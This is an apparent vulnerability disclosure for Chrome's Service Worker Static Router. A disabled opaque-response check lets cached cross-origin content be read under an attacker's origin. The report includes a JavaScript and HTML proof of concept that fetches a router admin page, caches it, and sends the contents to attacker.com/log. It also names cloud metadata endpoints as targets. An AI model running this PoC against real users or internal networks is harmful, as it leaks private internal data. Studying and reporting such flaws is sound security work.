# Finding 241: Service Worker Static Router Serves Opaque Cross-Origin Responses as Navigation

## Summary

Chrome's Service Worker Static Router can serve opaque (cross-origin no-cors) responses from CacheStorage as navigation responses by default. The validation check (`kServiceWorkerStaticRouterOpaqueCheck`) is DISABLED. This allows an attacker-controlled service worker to fetch cross-origin content (without cookies), store it in cache, and render it under the attacker's origin where JavaScript can read it — bypassing CORS for unauthenticated resources.

## Severity: Medium (CORS bypass for unauthenticated content / internal network disclosure)

## Affected Component

- Service Worker Static Router (cache source)
- `content/common/features.cc:706-710` (feature DISABLED by default)
- `content/browser/service_worker/service_worker_main_resource_loader.cc:914-935`
- `content/common/service_worker/service_worker_resource_loader.cc:28-70`

## Root Cause

`content/common/features.cc:706-710`:
```cpp
// crbug.com/495999481
BASE_FEATURE(kServiceWorkerStaticRouterOpaqueCheck,
             base::FEATURE_DISABLED_BY_DEFAULT);
```

When disabled, `service_worker_main_resource_loader.cc:914-935` computes the validation result but does NOT enforce it:
```cpp
if (!IsValidStaticRouterResponse(...) &&
    base::FeatureList::IsEnabled(features::kServiceWorkerStaticRouterOpaqueCheck)) {
  // Only blocks when flag is ENABLED
  CommitCompleted(net::ERR_FAILED, ...);
  return;
}
// Falls through — opaque response served as navigation
```

## Attack Scenario

1. Attacker registers a service worker at `https://attacker.com/sw.js`
2. During install, the SW fetches `http://internal-server.corp/secret-data` with `{mode: 'no-cors'}` (returns opaque response)
3. The opaque response is stored in CacheStorage keyed to `/steal`
4. SW registers a static route: `{condition: {urlPattern: "/steal"}, source: "cache"}`
5. Victim (who has access to internal-server.corp) visits `https://attacker.com/steal`
6. Static router retrieves the opaque response from cache and serves it as the navigation response
7. Page commits under `attacker.com` origin with body content from `internal-server.corp`
8. Attacker's script on the page reads `document.body.innerHTML` — the internal content is now exfiltrated

### Concrete PoC

```javascript
// sw.js (attacker's service worker)
self.addEventListener('install', async (event) => {
  event.waitUntil((async () => {
    // Fetch internal/cross-origin resource without cookies
    const response = await fetch('http://192.168.1.1/admin/config', {mode: 'no-cors'});
    // Store opaque response keyed to attacker's URL
    const cache = await caches.open('exfil');
    await cache.put('/steal', response);
  })());
});

self.addEventListener('activate', (event) => {
  event.waitUntil(self.registration.router.register([{
    condition: { urlPattern: "/steal" },
    source: { cacheName: "exfil" }
  }]));
});
```

```html
<!-- attacker.com/index.html -->
<script>
navigator.serviceWorker.register('/sw.js');
navigator.serviceWorker.ready.then(() => {
  // Navigate to the static-routed URL
  window.location = '/steal';
});
</script>
```

```html
<!-- attacker.com/reader.html (opened after /steal loads) -->
<script>
// This page reads the exfiltrated content
fetch('/steal').then(r => r.text()).then(body => {
  // Send internal data to attacker's server
  navigator.sendBeacon('https://attacker.com/log', body);
});
</script>
```

## Security Impact

### 1. Internal Network Resource Disclosure
Corporate intranets, router admin pages, cloud metadata endpoints (169.254.169.254) accessible from the victim's browser can be fetched (no-cors), cached, and read by the attacker.

### 2. CORP Bypass
`kServiceWorkerStaticRouterCORPCheck` is also DISABLED by default. Resources with `Cross-Origin-Resource-Policy: same-origin` can be served through the cache source unblocked.

### 3. IP-restricted Content Leakage
Content served only to specific IP ranges (e.g., university journal access) can be exfiltrated.

## Limitations

- **No victim cookies sent**: The `no-cors` fetch does NOT include target site cookies. Only public/IP-restricted content is accessible.
- **Same behavior in fetch handler**: The normal `event.respondWith(opaqueResponse)` path also lacks this check. However, static routing makes it declarative and less auditable.
- **HTTPS-first**: The SW must be on HTTPS. The cross-origin resource can be HTTP (mixed content for sub-resource fetch in SW is less restricted).
- **Known to Chrome team**: Tracked at crbug.com/495999481. But still unfixed in default configuration.

## Why This Is VRP-Reportable

1. **ENABLED by default on all platforms** — no flags needed
2. **CORS bypass for network-local resources** — practical impact for corporate/enterprise users
3. **The fix exists but is intentionally gated** — the check is written but disabled
4. **CORP bypass** — undermines Cross-Origin-Resource-Policy deployments
5. **No user interaction required** — victim just visits attacker.com

## Differentiation from Normal SW Behavior

The key argument for VRP: while `respondWith(opaqueResponse)` has always been possible, it requires **active JS execution** during every navigation. The static router makes this:
- Declarative (register once, applies forever)
- Invisible to runtime monitoring
- Not caught by CSP or other policies

The Chromium team added the check (just behind a flag), proving they recognize the security gap.

## Platform

All platforms (Desktop and Mobile Chrome) with default configuration.

## Files

- `content/common/features.cc:706-710` (kServiceWorkerStaticRouterOpaqueCheck DISABLED)
- `content/common/features.cc:703-704` (kServiceWorkerStaticRouterCORPCheck DISABLED)
- `content/browser/service_worker/service_worker_main_resource_loader.cc:914-935`
- `content/renderer/service_worker/service_worker_subresource_loader.cc:1499-1513`
- `content/common/service_worker/service_worker_resource_loader.cc:28-70`
- `content/browser/service_worker/service_worker_cache_storage_matcher.cc`
